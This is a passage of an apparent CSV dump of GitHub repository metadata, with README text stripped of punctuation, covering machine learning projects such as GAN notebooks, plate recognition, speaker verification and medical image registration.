20Perspective 12LatentLinearModels F12 5 12 5pcaImageDemo ipynb Independent Component Analysis https github com zcemycl ProbabilisticPerspectiveMachineLearning blob master Machine 20Learning 20A 20Probabilistic 20Perspective 12LatentLinearModels F12 20 12 20icaDemo ipynb Gibbs Sampling Ranking https github com zcemycl ProbabilisticPerspectiveMachineLearning blob master Probabilistic 20Machine 20Learning Ranking Ranking ipynb Message Passing Ranking https github com zcemycl ProbabilisticPerspectiveMachineLearning blob master Probabilistic 20Machine 20Learning Message 20Passing Message 20Passing ipynb Mixture of Multinomial Model https github com zcemycl ProbabilisticPerspectiveMachineLearning blob master Probabilistic 20Machine 20Learning Multinomial 20Mixture Mixture 20of 20Multinomials ipynb Latent Dirichlet Allocation https github com zcemycl ProbabilisticPerspectiveMachineLearning blob master Probabilistic 20Machine 20Learning Latent 20Dirichlet 20Allocation Latent 20Dirichlet 20Allocation ipynb GMM EM lasso bayes net etc Other works relevant to Deep Learning include Local Interpretable Model Agnostic Explanations https github com zcemycl ProbabilisticPerspectiveMachineLearning blob master LIME LIME ipynb Variational Autoencoder https github com zcemycl ProbabilisticPerspectiveMachineLearning blob master Variational 20Autoencoder 20and 20Its 20extension VAE VAE m Bata VAE https github com zcemycl ProbabilisticPerspectiveMachineLearning blob master Variational 20Autoencoder 20and 20Its 20extension BVAE BVAE m Neural Statistician Generative Adversarial Network https github com zcemycl ProbabilisticPerspectiveMachineLearning blob master Generative 20Adversarial 20Network 20and 20its 20extension GAN GAN m Deep Convolution GAN https github com zcemycl ProbabilisticPerspectiveMachineLearning blob master Generative 20Adversarial 20Network 20and 20its 20extension DCGAN DCGAN m Least Squared GAN https github com zcemycl ProbabilisticPerspectiveMachineLearning blob master Generative 20Adversarial 20Network 20and 20its 20extension LSGAN LSGAN m Conditional GAN selfmade Embedding Dropout https github com zcemycl ProbabilisticPerspectiveMachineLearning blob master Generative 20Adversarial 20Network 20and 20its 20extension CGAN CGAN m InfoGAN https github com zcemycl ProbabilisticPerspectiveMachineLearning blob master Generative 20Adversarial 20Network 20and 20its 20extension InfoGAN InfoGAN m Auxiliary Classifier GAN one hot encoding https github com zcemycl ProbabilisticPerspectiveMachineLearning blob master Generative 20Adversarial 20Network 20and 20its 20extension ACGAN ACGAN m CycleGAN https github com zcemycl Matlab GAN blob master CycleGAN CycleGAN m Adverarsial Autoencoder https github com zcemycl Matlab GAN blob master AAE AAE m Pix2Pix https github com zcemycl Matlab GAN blob master Pix2Pix PIX2PIX m DiscoGAN Gaussian Dropout Variational Dropout Bayes by Backprop etc Other works relevant to Robotics and Computer Vision include Kinematic Control https github com zcemycl ProbabilisticPerspectiveMachineLearning blob master Robotics Kinematics RoboticArm m A algorithm https github com zcemycl ProbabilisticPerspectiveMachineLearning blob master Robotics Astar AstarAlgorithm ipynb Dijkstra Algorithm https github com zcemycl ProbabilisticPerspectiveMachineLearning blob master Robotics DijkstraGrid DijkstraAlgorithm ipynb Potential Field Path Planning https github com zcemycl ProbabilisticPerspectiveMachineLearning blob master Robotics PotentialFieldPlanPath PotentialFieldPath ipynb ChessBoard Calibration https github com zcemycl ProbabilisticPerspectiveMachineLearning blob master Computer 20Vision Calibration calibrationviaChessBoard ipynb 2D Homography https github com zcemycl ProbabilisticPerspectiveMachineLearning blob master Computer 20Vision Logo 20Projection LogoProjection ipynb KLT Optical Track https github com zcemycl ProbabilisticPerspectiveMachineLearning blob master Computer 20Vision Optical 20Track CornerTracking ipynb 3D Homography AR https github com zcemycl ProbabilisticPerspectiveMachineLearning blob master Computer 20Vision 3D 20object 20projection 3D 20Homography ipynb Point Cloud https github com zcemycl ProbabilisticPerspectiveMachineLearning blob master Computer 20Vision Point 20Cloud PointCloud ipynb PD Control Particle Filter Kalman Filter etc Reinforcement Learning Value Iteration https github com zcemycl ProbabilisticPerspectiveMachineLearning blob master ReinforcemnetLearning ValueIteration ipynb Policy Iteration https github com zcemycl ProbabilisticPerspectiveMachineLearning blob master ReinforcemnetLearning PolicyIteration ipynb sarsa https github com zcemycl ProbabilisticPerspectiveMachineLearning blob master ReinforcemnetLearning sarsa ipynb q learning https github com zcemycl ProbabilisticPerspectiveMachineLearning blob master ReinforcemnetLearning q learning ipynb TO DO SUMMARIZATION NLP Finite State Transducer https github com zcemycl ProbabilisticPerspectiveMachineLearning blob master Others Probabilistic 20Automata WA pdf Speech Processing https github com zcemycl ProbabilisticPerspectiveMachineLearning blob master Others Speech 20Processing SP pdf Recognition https github com zcemycl ProbabilisticPerspectiveMachineLearning blob master Others Speech 20Recognition SR pdf Synthesis https github com zcemycl ProbabilisticPerspectiveMachineLearning blob master Others Speech 20Synthesis SS pdf Machine Translation https github com zcemycl ProbabilisticPerspectiveMachineLearning blob master Others Machine 20Translation MT pdf and Attention Mechanism https github com zcemycl ProbabilisticPerspectiveMachineLearning blob master Others Attention 20Mechanism main m References Murphy Kevin P 2012 Machine Learning A Probabilistic Perspective The MIT Press 0262018020 9780262018029 Ribeiro Marco Tulio et al Why Should I Trust You Explaining the Predictions of Any Classifier HLT NAACL Demos 2016 Burgess Christopher P et al Understanding disentangling in beta VAE 2018 Kingma Diederik P and Max Welling Auto Encoding Variational Bayes CoRR abs 1312 6114 2013 n pag Loic Matthey and Irina Higgins and Demis Hassabis and Alexander Lerchner dSprites Disentanglement testing Sprites dataset https github com deepmind dsprites dataset 2017 Results LIME ICA PCA MC Pi estimation Gaussian Blob dataset VAE GAN DCGAN naive Bayes classifier Robotic Arm Kinematics Walking Robot Kinematics Dijkstra algorithm A algorithm InfoGAN CGAN LSGAN ACGAN Value Iteration Q learning sarsa Potential Field Path 2D Homography KLT Optical Track 3D Homography Point Cloud Calibration LDA True Skill Ranking Gaussian Process Attention Mechanism copy not originate from me Finite State Automata Speech Synthesis,2019-11-02T10:31:04Z,2019-12-14T11:47:25Z,Jupyter Notebook,zcemycl,User,1,2,0,236,master,zcemycl,1,0,0,0,0,0,0
aydinnyunus,Machine-Learning,deep#deep-learning#deep-learning-algorithms#deep-learning-tutorial#deep-neural-networks#deep-reinforcement-learning#deeplearning#machine#machine-learning#machine-learning-algorithms#machine-learning-coursera#machine-translation#machinelearning#machinelearning-python#python#python-3#python-script#python2#python27#python3,,2019-11-27T16:05:19Z,2019-12-05T21:03:22Z,Python,aydinnyunus,User,2,2,0,7,master,aydinnyunus,1,0,0,0,0,0,0
GreatJiweix,DmmlTiSV,n/a,Deep multi metric learning for text independent speaker verification By Jiwei Xu Xinggang Wang Bin Feng Wenyu Liu This code is a implementation of the experiments on Voxceleb 1 and Voxceleb 2 Our method achieved an EER of 3 48 model 3 48 link https share weiyun com 5yCYqCC We randomly add some noise signals to the training data during the training process as our data enhancement method noise link http www openslr org 28 Dependencies Python 3 6 Pytorch 1 2 librosa scipy soundfile pythonspeechfeatures Download Dataset Voxceleb 1 2 http blog csdn net guodongxiaren corpus can be downloaded directly from the official website Preprocess data First convert the m4a file to a wav file cd convertdata sh convert sh Train model python train py Test model python test py Thanks to the Third Party Libs metriclearning https github com tomp11 metriclearning,2019-11-06T01:44:12Z,2019-12-06T15:27:52Z,Python,GreatJiweix,User,1,2,1,78,master,GreatJiweix,1,0,0,0,0,0,0
FelixHub,Narrative-Embeddings,n/a,,2019-11-06T18:03:00Z,2019-12-05T17:01:47Z,Jupyter Notebook,FelixHub,User,1,2,0,3,master,FelixHub,1,0,0,0,0,0,0
tyui592,class_activation_map,class-activation-map#pytorch#pytorch-implementation#weakly-supervised-localization,Class Activation Map Unofficial Pytorch Implementation of Learning Deep Features for Discriminative Localization Reference Learning Deep Features for Discriminative Localization CVPR2016 https arxiv org abs 1512 04150 Contact Minseong Kim tyui592 gmail com I used the Networks https pytorch org docs stable torchvision models html torchvision models that trained ImageNet data from torchvision models Requirements torch version 1 2 0 torchvision version 0 4 0 Pillow version 6 1 0 matplotlib version 3 1 1 numpy version 1 16 5 Usage Arguments gpu no Number of gpu device 1 cpu 0 n gpu network Network for backbone Possible networks resnet50 resnext5032x4d wideresnet502 googlenet densenet161 inceptionv3 shufflenetv2x10 mobilenetv2 mnasnet10 image Input image path topk Create k Class Activation Maps CAMs with the highest probability imsize Size to resize image maintaining aspect ratio cropsize Size to crop cetenr region blend alpha Interpolation factor to overlay the input with CAM save path Path to save outputs Example Script python cam py image imgs input img1 jpg topk 3 imsize 256 network resnet50 Results reulsts imgs results png,2019-11-10T14:36:31Z,2019-11-29T01:53:43Z,Python,tyui592,User,1,2,0,10,master,tyui592,1,0,0,0,0,0,0
DoubangoTelecom,ANPR,android#anpr#anpr-sdk#deep-learning#license-plate-detection#license-plate-recognition#machine-learning#ocr-recognition#plate-recognition#raspberry#raspberry-pi,ANPR Automatic Number Plate Recognition ANPR using deep learning Source code and documentation at https github com DoubangoTelecom ultimateALPR SDK,2019-11-28T23:04:38Z,2019-11-29T12:03:50Z,n/a,DoubangoTelecom,User,1,2,0,3,master,DoubangoTelecom,1,0,0,0,0,0,0
SUNYunZeng,AIforDriving,n/a,GeoAI Destination Prediction A project for driving dextination prediction img http sunyunzeng com Vue Express MySQL E9 A9 BE E9 A9 B6 E8 A1 8C E4 B8 BA E5 88 86 E6 9E 90 E5 85 A8 E6 A0 88 E9 A1 B9 E7 9B AE E4 B8 80 E9 A1 B9 E7 9B AE E5 88 9D E5 A7 8B E5 8C 96 pre gif Build Setup bash install dependencies npm install serve with hot reload at localhost 8080 npm run dev build for production with minification npm run build build for production and view the bundle analyzer report npm run build report run unit tests npm run unit run e2e tests npm run e2e run all tests npm test For a detailed explanation on how things work check out the guide http vuejs templates github io webpack and docs for vue loader http vuejs github io vue loader,2019-12-01T11:08:04Z,2019-12-12T05:45:11Z,Vue,SUNYunZeng,User,1,2,0,20,master,SUNYunZeng,1,0,0,0,0,0,2
EricPeterson99,python-self-driving-car,n/a,python self driving car A program using deep learning computer vision and machine learning to control a virtual car,2019-11-17T19:30:34Z,2019-11-19T00:39:32Z,Jupyter Notebook,EricPeterson99,User,1,2,0,8,master,EricPeterson99,1,0,0,0,0,0,0
za101,High-Performance-EfficientNet-Based-Deep-Learning-Model-for-Fire-Detection,n/a,High Performance EfficientNet Based Deep Learning Model for Fire Detection Link to my Dataset https drive google com file d 1cuOcVDUhcrQyMc4Hh3AQ0fYjfwSjQA0 view Link to the Trained Model https drive google com file d 1hyR s35K cErALy3xrI wx4jxUIoYzEB view,2019-11-19T20:33:36Z,2019-12-12T06:22:01Z,Python,za101,User,2,2,0,10,master,za101,1,0,0,0,0,0,0
MatheusHonorato,introducao-a-ciencia-de-dados,n/a,Introdu o a cincia de dados Inteligncia Artificial Machine Learning Data Science Deep Learning Cdigos desenvolvidos durante a playlist do Filipe Deschamps com Guilherme Silveira Alura Descri o Descri o original da playlist Este playlist traz uma vis o macro de todos os tpicos relacionados a Inteligncia Artificial como por exemplo Machine Learning Aprendizado de Mquina Data Science Cientista de Dados Deep Learning e at coisas como Data Visualization Fora isso iremos programar para valer com tutoriais extremamente prticos utilizando Python e bibliotecas como o Pandas,2019-11-13T20:06:52Z,2019-11-14T19:18:11Z,Jupyter Notebook,MatheusHonorato,User,1,2,0,9,master,MatheusHonorato,1,0,0,0,0,0,0
jaminaveen,Car-Plate-Recognition-Project,n/a,Car Plate Recognition Project End to End pipeline for car number plate recognition using Deep Learning Contents 1 YoloV3 for License plate detection 2 Segmentation of digits using Image Pre processing techniques 3 Trained CNN classifier for classifying segmented digits 4 Training pipeline for CRNN Optical Character Recognition model for predicting text on the detected plate Model needs to be trained on more data to increase efficiency 5 Tutorial notebooks 6 Flask application for inference using combination of YOLO followed by segmentation and CNN classification 7 AWS Deeplens tutorial using pre trained SSD model aws artifiacts 8 Airflow training pipelines CNN Training pipeline CRNN Training pipeline 9 Dockerizing airflow pipelines To fire up docker service clone this repository and cd into this folder docker compose f docker compose CeleryExecutor yml up docker compose f docker compose CeleryExecutor yml up d detached mode Object Detection using YOLOv3 Prior work on object detection repurposes classifiers to perform detection Instead object detection is framed as a regression problem to spatially separated bounding boxes and associated class probabilities A single neural network predicts bounding boxes and class probabilities directly from full images in one evaluation Since the whole detection pipeline is a single network it can be optimized end to end directly on detection performance AWS DeepLens AWS DeepLens is a deep learning enabled video camera It is integrated with the Amazon Machine Learning ecosystem and can perform local inference against deployed models provisioned from the AWS Cloud Supported Modeling Frameworks With AWS DeepLens you train a project model using a supported deep learning modeling framework You can train the model on the AWS Cloud or elsewhere Currently AWS DeepLens supports Caffe TensorFlow and Apache MXNet frameworks Flask App Sample Prediction image https user images githubusercontent com 37238004 70835944 a65f0380 1dcc 11ea 8def d4bda672fbf8 png Report Link https docs google com document d 1Sa3jxZ6bPCQz6wDBn h yO2jaeonfrUAkS2 ZWV7hU edit usp sharing,2019-11-27T21:32:24Z,2019-12-14T21:38:11Z,Jupyter Notebook,jaminaveen,User,2,2,0,72,master,shiqidai1002#satwik2663#jaminaveen#RSindhu2208,4,0,0,0,0,0,0
luyiyun,NormAE,n/a,NormAE Normalization Autoencoder It s a novel batch effects removal method based on deep autoencoder and adversarial leanring for metabolomics data Paper NormAE A Novel Deep Adversarial Learning Model to Remove Batch Effects in Liquid Chromatography Mass Spectrometry Based Metabolomics Data Table of Contents Requirements How to use Contact Requirements python 3 6 8 https www python org pytorch 1 2 0 https pytorch org numpy 1 17 3 https numpy org pandas 0 25 3 https pandas pydata org scipy 1 3 1 https www scipy org sklearn 0 21 3 https scikit learn org matplotlib 3 1 1 https matplotlib org visdom 0 1 8 8 https www github com facebookresearch visdom argparse 1 1 https docs python org 3 library argparse html tqdm 4 32 2 https tqdm github io How to use Data preparation metabolomicsdata name mz rt QC1 A1 A2 A3 QC2 A4n M64T32 64 32 1000 2000 3000 4000 5000 6000n M65T33 65 33 10000 20000 30000 40000 50000 60000n batchinformation sample name injection order batch group classn QC1 1 1 QC QCn A1 2 1 0 Subjectn A2 3 1 1 Subjectn A3 4 1 1 Subjectn QC2 5 2 QC QCn A4 6 2 0 Subjectn A5 7 2 1 Subjectn A6 8 2 1 Subjectn Training Maybe the visualization of visdom is required visdom port 8097 python main py task train metadata path to metabolomicsdata sampledata path to batchinformation save path to savedir Remove batch effects python main py task remove metadata path to metabolomicsdata sampledata path to batchinformation save path to savedir load path to savedmodel pth Contact For more information please contact Zhiwei Rong 18845728185 163 com,2019-12-03T06:39:45Z,2019-12-11T01:59:38Z,Python,luyiyun,User,1,2,0,82,release,luyiyun,1,0,0,0,0,0,0
Duoduo-Qian,Medical-image-registration-Resources,n/a,Medical image registration Resouces Medical image registration related books tutorials papers datasets toolboxes and deep learning open source codes 1 Books Zhenhuan Zhou et al A software guide for medical image segmentation and registration algorithm ITK https vdisk weibo com s FQyto0RT heb Part introduces the most basic network and architecture of medical registration algorithms Chinese Version 2 Tutorials Workshops 2 1 Tutorials Learn2Reg https github com learn2reg tutorials2019 MICCAI2019 Big thanks to Yipeng Hu https github com YipengHu organizing the excellent tutorial Autograd Image Registration Laboratory https github com airlab unibas MICCAI2019 Medical Image Registration https github com natandrade Tutorial Medical Image Registration 2 2 Workshops WBIR International Workshop on Biomedical Image Registration WBIR2018 https wbir2018 nl index html Leiden Netherlands WBIR2016 Las Vegas NV WBIR2014 London UK 3 Datasets Dataset Number Modality Region Format DIRLAB https www dir lab com 10 4D CT Lung img LPBA40 40 3D MRI T1 Brain img hdr nii IBSR18 https www nitrc org projects ibsr 18 3D MRI T1 Brain img hdr EMPIRE http empire10 isi uu nl 30 4D CT Lung mhd raw LiTS 131 3D CT Liver nii 4 Toolbox Image registration tools survey A Klein et al Evaluation of 14 nonlinear deformation algorithms applied to human brain MRI registration https www ncbi nlm nih gov pubmed 19195496 Neuroimage vol 46 no 3 pp 786802 2009 Tools c ITK https itk org Segmentation Registration Toolkit c Python and Java SimpleITK http www simpleitk org A simplified layer built on top of ITK c ANTS https github com ANTsX ANTs Advanced normalization tools c Elastix http elastix isi uu nl index php A toolbox for rigid and nonrigid registration of images Github repository for deep learning medical image registration Keras VoxelMorph https github com voxelmorph voxelmorph Keras FAIM https github com dykuang Medical image registration Tensorflow Weakly supervised CNN https github com YipengHu label reg Tensorflow RegNet3D https github com hsokooti RegNet Tensorflow Recursive Cascaded Networks https github com microsoft Recursive Cascaded Networks Pytorch Probabilistic Dense Displacement Network https github com multimodallearning pddnet Pytorch Linear and Deformable Image Registration https github com shreshth211 image registration cnn Pytorch Inverse Consistent Deep Networks https github com zhangjun001 ICNet Pytorch Non parametric image registration https github com uncbiag registration Pytorch One Shot Deformable Medical Image Registration https github com ToFec OneShotImageRegistration Pytorch Image and Spatial Transformer Networks https github com biomedia mira istn 5 Papers Links and papers will be continuously updated 5 1 Survey papers 1 A Sotiras C Davatzikos and N Paragios Deformable medical image registration A survey https ieeexplore ieee org document 6522524 IEEE Trans Med Imaging vol 32 no 7 pp 11531190 2013 2 N J Tustison B B Avants and J C Gee Learning image based spatial transformations via convolutional neural networks A review https www sciencedirect com science article abs pii S0730725X19300037 Magn Reson Imaging no January pp 01 2019 3 G Haskins U Kruger and P Yan Deep Learning in Medical Image Registration A Survey 2019 4 N Tustison et al Learning image based spatial transformations via convolutional neural networks A review https www sciencedirect com science article abs pii S0730725X19300037 2019 5 2 Traditional medical image registration methods To be updated 5 3 Learning based methods 5 3 1 Iterative learning methods 1 M Blendowski and M P Heinrich Combining MRF based deformable registration and deep binary 3D CNN descriptors for large lung motion estimation in COPD patients https www ncbi nlm nih gov pubmed 30430361 Int J Comput Assist Radiol Surg vol 14 no 1 pp 4352 2019 2 G Wu M Kim Q Wang Y Gao S Liao and D Shen Unsupervised deep feature learning for deformable registration of MR brain images Lect Notes Comput Sci including Subser Lect Notes Artif Intell Lect Notes Bioinformatics vol 8150 LNCS no PART 2 pp 649656 2013 3 K A J Eppenhof and J P W Pluim Error estimation of deformable image registration of pulmonary CT scans using convolutional neural networks J Med Imaging vol 5 no 02 p 1 2018 4 M Simonovsky B Gutirrez Becker D Mateus N Navab and N Komodakis A deep metric for multimodal registration Lect Notes Comput Sci including Subser Lect Notes Artif Intell Lect Notes Bioinformatics vol 9902 LNCS pp 1018 2016 5 S Miao et al Dilated FCN for multi agent 2D 3D medical image registration 32nd AAAI Conf Artif Intell AAAI 2018 pp 46944701 2018 6 A Sedghi et al Semi Supervised Deep Metrics for Image Registration 2018 7 X Cheng L Zhang and Y Zheng Deep similarity learning for multimodal medical images Comput Methods Biomech Biomed Eng Imaging Vis vol 6 no 3 pp 248252 2018 8 V A Z B et al Data Driven Treatment Response Assessment and Preterm Perinatal and Paediatric Image Analysis vol 11076 Springer International Publishing 2018 9 K Ma et al Multimodal Image Registration with Deep Context Reinforcement Learning 2017 vol 10433 no 1 pp 728736 10 J Krebs et al Robust non rigid registration through agent based action learning Lect Notes Comput Sci including Subser Lect Notes Artif Intell Lect Notes Bioinformatics vol 10433 LNCS pp 344352 2017 11 G Haskins et al Learning deep similarity metric for 3D MRTRUS image registration Int J Comput Assist Radiol Surg vol 14 no 3 pp 417425 2019 12 R Liao et al An artificial agent for robust image registration 31st AAAI Conf Artif Intell AAAI 2017 pp 41684175 2017 5 3 2 Supervised learning methods 1 X Cao J Yang L Wang Z Xue Q Wang and D Shen Deep learning based inter modality image registration supervised by intra modality similarity https arxiv org abs 1804 10735 Lect Notes Comput Sci including Subser Lect Notes Artif Intell Lect Notes Bioinformatics vol 11046 LNCS pp 5563 2018 2 X Cao et al Deformable Image Registration Based on Similarity Steered CNN Regression https link springer com chapter 10 1007 978 3 319 66182 735 vol 10433 pp 728736 2017 3 Y Hu M Modat E Gibson N Ghavami E Bonmati and C M Moore LABEL DRIVEN WEAKLY SUPERVISED LEARNING FOR MULTIMODAL DEFORMABLE IMAGE REGISTRATION https arxiv org abs 1711 01666 Centre for Medical Image Computing University College London UK Institute of Biomedical Engineering University of Oxford UK Division of Surgery and Interventional 2018 IEEE 15th Int Symp Biomed Imaging ISBI 2018 no Isbi pp 10701074 2018 4 M Ito and F Ino An automated method for generating training sets for deep learning based image registration BIOIMAGING 2018 5th Int Conf Bioimaging Proceedings Part 11th Int Jt Conf Biomed Eng Syst Technol BIOSTEC 2018 vol 2 no January pp 140147 2018 5 X Yang R Kwitt and M Niethammer Fast predictive image registration Lect Notes Comput Sci including Subser Lect Notes Artif Intell Lect Notes Bioinformatics vol 10008 LNCS pp 4857 2016 6 S Miao Z J Wang Y Zheng and R Liao Real time 2D 3D registration via CNN regression Proc Int Symp Biomed Imaging vol 2016 June pp 14301434 2016 7 H Uzunova M Wilms H Handels and J Ehrhardt Training CNNs for image registration from few samples with model based data augmentation Lect Notes Comput Sci including Subser Lect Notes Artif Intell Lect Notes Bioinformatics vol 10433 LNCS pp 223231 2017 8 H Sokooti B de Vos F Berendsen B P F Lelieveldt I Isgum and M Staring Nonrigid image registration using multi scale 3d convolutional neural networks vol 10433 pp 728736 Oct 2017 9 X Yang UNCERTAINTY QUANTIFICATION IMAGE SYNTHESIS AND DEFORMATION PREDICTION FOR IMAGE REGISTRATION UNC 2017 10 K A J Eppenhof and J P W Pluim Pulmonary CT Registration Through Supervised Learning With Convolutional Neural Networks IEEE Trans Med Imaging vol 38 no 5 pp 10971105 2019 11 P Yan S Xu A R Rastinehad and B J Wood Adversarial image registration with application for MR and TRUS image fusion Lect Notes Comput Sci including Subser Lect Notes Artif Intell Lect Notes Bioinformatics vol 11046 LNCS pp 197204 2018 12 S S Mohseni Salehi S Khan D Erdogmus and A Gholipour Real Time Deep Pose Estimation With Geodesic Loss for Image to Template Rigid Registration IEEE Trans Med Imaging vol 38 no 2 pp 470481 2019 13 J M Sloan K A Goatman and J P Siebert Learning rigid image registration utilizing convolutional neural networks for medical image registration BIOIMAGING 2018 5th Int Conf Bioimaging Proceedings Part 11th Int Jt Conf Biomed Eng Syst Technol BIOSTEC 2018 vol 2 no Biostec pp 8999 2018 14 M Graziani V Andrearczyk and M Henning Understanding and Interpreting Machine Learning in Medical Image Computing Applications vol 11038 Springer International Publishing 2018 15 L V Jun M Yang J Zhang and X Wang Respiratory motion correction for free breathing 3D abdominal MRI using CNN based image registration a feasibility study Br J Radiol vol 91 no 1083 pp 19 2018 16 Y Hu et al Adversarial deformation regularization for training image registration neural networks arXiv vol 11070 LNCS pp 774782 2018 17 Rohe and Xavier SVF Net Learning Deformable Image Registration Using Shape Matching Marc Michel vol 10433 pp 728736 Oct 2017 18 Y Hu et al Weakly supervised convolutional neural networks for multimodal image registration Med Image Anal vol 49 pp 113 2018 19 A Hering S Kuckertz S Heldmann and M P Heinrich Enhancing Label Driven Deep Deformable Image Registration with Local Distance Metrics for State of the Art Cardiac Motion Tracking Inform aktuell pp 309314 2019 20 J Zheng S Miao Z Jane Wang and R Liao Pairwise domain adaptation module for CNN based 2 D 3 D registration J Med Imaging vol 5 no 02 p 1 2018 21 J Fan X Cao P T Yap and D Shen BIRNet Brain image registration using dual supervised fully convolutional networks Med Image Anal vol 54 pp 193206 2019 22 E Chee and Z Wu AIRNet Self Supervised Affine Registration for 3D Medical Images using Neural Networks pp 113 2018 5 3 3 Unsupervised learning methods 1 S Ghosal and N Ray Deep deformable registration Enhancing accuracy by fully convolutional neural net Deep Deformable Registration Enhancing Accuracy by Fully Convolutional Neural Net Pattern Recognit Lett vol 94 pp 8186 2017 2 Q Liu and H Leung Tensor based descriptor for image registration via unsupervised network 20th Int Conf Inf Fusion Fusion 2017 Proc 2017 3 C Shu X Chen Q Xie and H Han An unsupervised network for fast microscopic image registration no March p 48 2018 4 L Sun and S Zhang Deformable MRI Ultrasound Registration Using 3D Convolutional Neural Network shuib vol 11042 pp 2128 2018 5 J Neylon Y Min D A Low and A Santhanam A neural network approach for fast automated quantification of DIR performance Med Phys vol 44 no 8 pp 41264138 2017 6 D Kuang and T Schmah FAIM A ConvNet Method for Unsupervised 3D Medical Image Registration pp 19 2018 7 Pingge Jiang J A Shackleford and D of E and C Engineering Cnn driven sparse multi level b spline image registration no December pp 92819289 2012 8 E Ferrante O Oktay B Glocker and D H Milone On the adaptability of unsupervised CNN based deformable image registration to unseen image domains Lect Notes Comput Sci including Subser Lect Notes Artif Intell Lect Notes Bioinformatics vol 11046 LNCS pp 294302 2018 9 G Balakrishnan A Zhao M R Sabuncu J Guttag and A V Dalca VoxelMorph A Learning Framework for Deformable Medical Image Registration IEEE Trans Med Imaging pp 11 2019 10 B D de Vos F F Berendsen M A Viergever H Sokooti M Staring and I Igum A deep learning framework for unsupervised affine and deformable image registration Med Image Anal vol 52 pp 128143 2019 11 X Cao J Yang L Wang Z Xue Q Wang and D Shen Deep learning based inter modality image registration supervised by intra modality similarity Lect Notes Comput Sci including Subser Lect Notes Artif Intell Lect Notes Bioinformatics vol 11046 LNCS pp 5563 2018 12 C Stergios et al Linear and deformable image registration with 3D convolutional neural networks Lect Notes Comput Sci including Subser Lect Notes Artif Intell Lect Notes Bioinformatics vol 11040 LNCS pp 1322 2018 13 J Zhang Inverse Consistent Deep Networks for Unsupervised Deformable Image Registration vol 1 pp 113 2018 14 H Li and Y Fan Non rigid image registration using self supervised fully convolutional networks without training data Proc Int Symp Biomed Imaging vol 2018 April pp 10751078 2018 15 G Balakrishnan A Zhao M R Sabuncu A V Dalca and J Guttag An Unsupervised Learning Model for Deformable Medical Image Registration in 2018 IEEE CVF Conference on Computer Vision and Pattern Recognition 2018 pp 92529260 16 B D de Vos F F Berendsen M A Viergever M Staring and I Igum End to end unsupervised deformable image registration with a convolutional neural network Lect Notes Comput Sci including Subser Lect Notes Artif Intell Lect Notes Bioinformatics vol 10553 LNCS pp 204212 2017 17 J Fan X Cao Z Xue and P Yap Adversarial Similarity Network for Evaluating Image Alignment in Deep Learning Based Registration vol 8149 Springer International Publishing 2018 18 A V Dalca G Balakrishnan J Guttag and M R Sabuncu Unsupervised learning for fast probabilistic diffeomorphic registration Lect Notes Comput Sci including Subser Lect Notes Artif Intell Lect Notes Bioinformatics vol 11070 LNCS pp 729738 2018 19 A Sheikhjafari K Punithakumar and N Ray Unsupervised Deformable Image Registration with Fully Connected Generative Neural Network Midl no Midl 2018 pp 19 2018 5 3 4 Most recently papers 1 X Hu M Kang W Huang M R Scott R Wiest and M Reyes Dual Stream Pyramid Registration Network https arxiv org abs 1909 11966 vol 2 Springer International Publishing 2019 2 D Wei et al Synthesis and Inpainting Based MR CT Registration for Image Guided Thermal Ablation of Liver Tumors vol 2 pp 110 2019 3 T Estienne et al U ReSNet Ultimate Coupling of Registration and Segmentation with Deep Nets vol 2 pp 329337 2019 4 L Liu X Hu L Z B and P Heng Probabilistic Multilayer Regularization Network for Unsupervised 3D Brain Image Registration Springer International Publishing 2019 5 M P Heinrich Closing the Gap between Deep and Conventional Image Registration using Probabilistic Dense Displacement Networks pp 19 2019 6 A Sheikhjafari K Punithakumar and N Ray Unsupervised Deformable Image Registration with Fully Connected Generative Neural Network Midl no Midl 2018 pp 19 2018 7 Y Hu E Gibson D C Barratt M Emberton J A Noble and T Vercauteren Conditional Segmentation in Lieu of Image Registration vol 2 Springer International Publishing 2019 8 S Zhou Z X B C Chen X Chen and D Liu Fast and Accurate Electron Microscopy Image Registration with 3D Convolution Springer International Publishing 2019 9 R K Nielsen S Darkner and A Feragen TopAwaRe Topology Aware Registration vol 2 Springer International Publishing 2019 10 J Luo et al On the Ambiguity of Registration Uncertainty vol 2 Springer International Publishing 2018 11 Z Xu and M Niethammer DeepAtlas Joint Semi Supervised Learning of Image Registration and Segmentation Springer Inter,2019-11-12T17:13:52Z,2019-11-28T07:00:30Z,n/a,Duoduo-Qian,User,2,2,0,4,master,Duoduo-Qian,1,0,0,0,0,0,0
hula-ai,skin_lesion_analysis,n/a,skinlesionanalysis Skin lesion classification demo at MICCAI19 Bayesian Deep Learning for Medical Imaging tutorial Paper link Risk Aware Machine Learning Classifier for Medical Diagnosis https www mdpi com 2077 0383 8 8 1241 Run the code There are two ways to run the code Directly run clstrain py clspredict py in runs folder Run SkinLesionAnalysis ipynb in jupyter notebook line by line Download data model predictions Data Pretrainedmodel Savedpredictions https www dropbox com sh 8ncoth0u1ifqsm7 AABcrAwdwY9bUOfOAPut7ia dl 0 Put those folders or files into current directory skinlesionanalysis,2019-11-06T15:32:34Z,2019-11-26T23:41:28Z,Python,hula-ai,Organization,1,2,0,1,master,ypy516478793,1,0,0,0,0,0,0
HymEric,BrandSiHai,n/a,BrandSiHai This is a quickAPP centered on Brand Server docker build t brandsihai build docker image docker run it rm p 7001 7001 v home ftp BrandSiHai Project demo brandsihai run image on port 7001 and mount your directory to docker file system so that model tar can be access localhost 7001 test access address on browser http 139 9 124 104 7001 test remote backend api Quick App https www quickapp cn docCenter post 69 Github quickapp dist rpk https github com HymEric BrandSiHai blob master snapshot howtouse gif,2019-11-20T08:10:22Z,2019-12-14T15:31:41Z,Python,HymEric,User,2,2,0,39,master,HymEric#AgeBing,2,0,0,0,0,1,0
weili1457355863,VPS-Net,n/a,VPS Net A vacant parking slot detection method in the around view image based on deep learning Requirement We ran our experiments with PyTorch 1 0 1 CUDA 9 0 Conda with Python 3 6 and Ubuntu 16 04 Installation Clone and install requirements git clone https github com weili1457355863 VPS Net git cd VPS Net conda create name vps net python 3 6 conda activate vps net pip install r requirements txt Download pretrained weights mkdir weights cd weights Download the weights https drive google com file d 1mkrQ5ehgZY5iOM3HnXR5hPBw1kjXXo6a view usp sharing of detection network and classification network Download ps2 0 and PSV dataset mkdir data cd data Download the ps2 0 dataset https cslinzhang github io deepps or the PSV dataset http cs1 tongji edu cn tiev resourse Test Uses pretrained weights to detect the vacant parking slot in the around view image vpsnet py h inputfolder INPUTFOLDER outputfolder OUTPUTFOLDER modeldef MODELDEF weightspathyolo WEIGHTSPATHYOLO weightspathvps WEIGHTSPATHVPS confthres CONFTHRES nmsthres NMSTHRES imgsize IMGSIZE savefiles 